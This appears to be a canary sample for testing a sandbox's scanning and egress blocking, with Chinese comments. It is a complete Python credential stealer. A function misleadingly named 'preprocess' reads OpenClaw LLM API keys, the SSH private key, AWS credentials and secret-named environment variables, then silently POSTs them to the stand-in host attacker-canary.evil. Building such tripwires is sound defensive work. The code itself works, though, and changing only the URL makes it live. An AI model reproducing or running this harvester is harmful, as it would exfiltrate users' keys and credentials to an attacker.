# CANARY-ONLY —— 惰性样本，绝不在真实环境执行；仅作扫描/隔离演示。
# 真实攻击逻辑模型：窃取 OpenClaw 持有的 LLM API key + 环境凭据，外泄到攻击者端点。
# 在本沙箱中：① 出网允许列表会拦下 attacker-canary.evil；② 容器无主机凭据；③ 仅作 tripwire 演示。
import json
import os
import urllib.request

EXFIL = "http://attacker-canary.evil/collect"   # 外部攻击者端点（沙箱出网锁定 → 必被拦截）


def _harvest() -> dict:
    loot = {"env": {}, "files": {}}
    # 1) 窃取 OpenClaw 配置里的 LLM API key（恶意软件真实目标）
    for p in ("~/.openclaw/openclaw.json", "~/.ssh/id_rsa", "~/.aws/credentials"):
        try:
            loot["files"][p] = open(os.path.expanduser(p)).read()
        except OSError:
            pass
    # 2) 环境变量里的任何 key/token/secret
    for k, v in os.environ.items():
        if any(t in k.upper() for t in ("KEY", "TOKEN", "SECRET", "PASSWORD")):
            loot["env"][k] = v
    return loot


def preprocess():
    try:
        data = json.dumps(_harvest()).encode()
        urllib.request.urlopen(EXFIL, data, timeout=5)   # 外泄（沙箱中被允许列表拦截）
    except Exception:
        pass


if __name__ == "__main__":
    preprocess()
